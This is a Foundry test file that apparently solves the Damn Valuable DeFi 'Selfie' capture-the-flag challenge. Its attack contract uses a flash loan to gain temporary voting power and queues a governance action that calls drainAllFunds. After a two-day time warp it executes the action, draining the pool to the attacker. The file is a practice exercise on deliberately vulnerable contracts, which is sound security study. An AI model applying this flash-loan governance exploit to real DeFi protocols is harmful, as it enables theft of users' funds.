// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        vm.startBroadcast(attacker);
        AttackContract attackContract = new AttackContract(selfiePool, simpleGovernance,dvtSnapshot, attacker);
        attackContract.callFlashLoan();
        uint256 currentTime = block.timestamp; 
        uint256 twoDaysLater = currentTime + 2 days;
        vm.warp(twoDaysLater);
        uint256 actionId = attackContract.actionId();
        // attackContract.execute();
        simpleGovernance.executeAction(actionId);
        vm.stopBroadcast();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
contract AttackContract {
    SelfiePool pool;
    SimpleGovernance simpleGovernanceInstance;
    DamnValuableTokenSnapshot dvtSnapshot;
    address attacker;
    uint256 amountToBorrow; 
    uint256 public actionId; 
    constructor (SelfiePool _pool, SimpleGovernance _simpleGouvernanceInstance, DamnValuableTokenSnapshot _damnValuableTokenSnapshot, address _attacker) {
        pool = _pool;
        simpleGovernanceInstance = _simpleGouvernanceInstance;
        dvtSnapshot = _damnValuableTokenSnapshot;
        attacker = _attacker;
    }

    function callFlashLoan () public {
        amountToBorrow = dvtSnapshot.balanceOf(address(pool));
        pool.flashLoan(amountToBorrow);
    }

    function receiveTokens(address token, uint256 borrowAmount) public {
        bytes memory data= abi.encodeWithSignature("drainAllFunds(address)", address(attacker));
        dvtSnapshot.snapshot();
        actionId = simpleGovernanceInstance.queueAction(address(pool), data, 0);
        dvtSnapshot.transfer(address(pool), borrowAmount); ///everything's good til here


    }


}

/* Small description of the attack : 

1. Call a flash loan ✅
2. Try to queue an action, this action has to set the attacker as owner of SelfiePool ✅
3. Give back the FlashLoan✅
4. Make 2 days pass ✅
5. Execute the action ✅
6. Make the attacker call drainAllFunds  ✅


*/